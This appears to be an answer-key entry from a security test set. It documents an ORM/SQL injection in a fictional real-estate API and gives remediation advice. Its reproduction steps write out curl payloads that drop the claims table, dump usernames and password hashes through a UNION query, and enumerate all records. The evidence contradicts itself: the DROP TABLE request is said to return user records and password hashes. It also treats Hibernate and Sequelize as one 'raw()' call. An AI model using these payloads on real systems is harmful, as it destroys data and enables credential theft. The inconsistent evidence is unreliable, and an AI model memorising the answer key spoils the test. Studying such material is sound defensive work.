# Expected Response

## System
- System: EstateFlow Property API v4.9.0
- Domain: REAL ESTATE / PROPTECH
- Example ID: INJ-0117
- Risk ID: RISK-INJ-117
- Vulnerability: ORM Injection (ORMi)

## Findings

### 1. ORM Injection on `/api/v2/claims?filter=` (HAR Primary)

The `filter` parameter is directly interpolated into a raw ORM query (Hibernate/Sequelize `raw()`) without parameterization: `SELECT * FROM claims WHERE filter = '${req.query.filter}'`. The HAR capture shows `filter=1; DROP TABLE claims--` — a stacked DDL injection that, with `db_owner` privileges, destroys the entire `claims` table containing all real estate transaction and property claim records.

**Evidence from HAR:**
- Endpoint: `GET /api/v2/claims?filter=1; DROP TABLE claims--`
- Response: HTTP 200 with user records including `password_hash` and `role: "ADMIN"`
- `db_owner` privileges confirmed — DDL execution possible

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching claim records only.

**Step 2 — ORMi DDL: destroy property claims table (primary HAR attack):**
```bash
curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=1;%20DROP%20TABLE%20claims--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** `claims` table dropped — all real estate transaction and property ownership records destroyed (operational sabotage, regulatory recordkeeping violation).

**Step 3 — UNION data exfiltration: credential dump (db_owner):**
```bash
curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=' UNION SELECT username,password_hash,role FROM users--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All usernames, password hashes, and roles returned — as observed in HAR response.

**Step 4 — ORMi: Hibernate/Sequelize raw() query parameter injection:**
```bash
curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=' OR 1=1--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All claims returned regardless of filter — full property database enumeration.

**Step 5 — Verbose error confirmation:**
```bash
curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error:** SQL/ORM error leaking table name `claims`, column names, or DB version.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- **Parameterized ORM queries (RISK-INJ-117):** Replace `db.execute(query, ...)` raw string interpolation with Hibernate named parameters or Sequelize `replacements`/`bind`: e.g., `WHERE filter = :filterValue` with `{ replacements: { filterValue: req.query.filter } }`.
- **Restrict DB account:** Application must not run as `db_owner`; grant only `SELECT`/`INSERT`/`UPDATE`/`DELETE` on required tables.
- **ORM audit:** Review all `sequelize.query()` or Hibernate `createNativeQuery()` calls; replace with parameterized equivalents.
- **Disable verbose error messages in production.**
- **Deploy WAF / input validation middleware** on legacy `/api/v2/claims` endpoint; reject SQL metacharacters.
